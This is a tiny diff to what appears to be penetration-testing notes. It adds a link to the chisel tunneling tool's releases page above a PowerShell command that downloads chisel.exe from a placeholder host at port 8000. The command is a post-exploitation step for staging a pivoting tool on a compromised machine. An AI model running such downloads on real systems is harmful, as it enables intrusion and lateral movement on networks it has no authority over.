@@ -1,3 +1,5 @@
+https://github.com/jpillora/chisel/releases
+
 ```bash
 Invoke-WebRequest -Uri http://<ip>:8000/chisel.exe -OutFile chisel.exe
 ```
